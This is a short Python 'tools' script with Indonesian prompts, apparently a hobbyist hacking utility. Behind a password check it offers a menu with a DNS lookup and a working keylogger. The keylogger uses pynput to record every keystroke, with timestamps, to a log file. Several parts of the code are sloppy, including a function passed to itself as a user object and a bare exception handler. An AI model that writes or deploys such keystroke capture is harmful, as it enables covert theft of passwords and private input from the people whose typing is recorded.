from getpass import getpass
import socket
from pynput.keyboard import Key, Listener
import logging
import time


try:
    def login(usr):
        usr.login = getpass("Masukan Sandi anda : ")
        pass_file = open("log.txt", "r")
        f = pass_file.readline()
        if usr.login == f:
            run_program()
        else:
            print("Sandi anda salah!")
    def run_program():
        index()
    def index():
        print("=========================")
        print("Welcome to my tools")
        print("Gunakan sebijaknya")
        print("author : Hans")
        print("=========================\n\n")
        print("< DL v1 >  DNS Lookup")
        print("< KL v1 > KeyLogger\n")
        key_input = input("masukan pilihan anda : ")
        if key_input == "DL":
            dlv1()
            return True
        if key_input == "KL":
            klv1()
            return True
        else:
            print("Masukan Pilihan Yang Benar...")
            time.sleep(1)
    def dlv1():
        web_input = input("Masukan Web address (contoh 'google.com') : ")
        sck_ghn = socket.gethostbyname(web_input)
        print("IP", sck_ghn, "   >   ", web_input, "\n\n")
        sck_gai = [ str(i[4][0]) for i in socket.getaddrinfo(web_input, 80) ]
        print("Addres Info >   ", sck_gai)
    def klv1():
        logging.basicConfig(filename=("keylogg.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
        def on_press(key):
            logging.info(str(key))
        with Listener(on_press=on_press) as listener :
            listener.join()
    login(usr=login)
except:
    print("Perintah Atau Command Yang Anda Masukan salah...")
    time.sleep(1)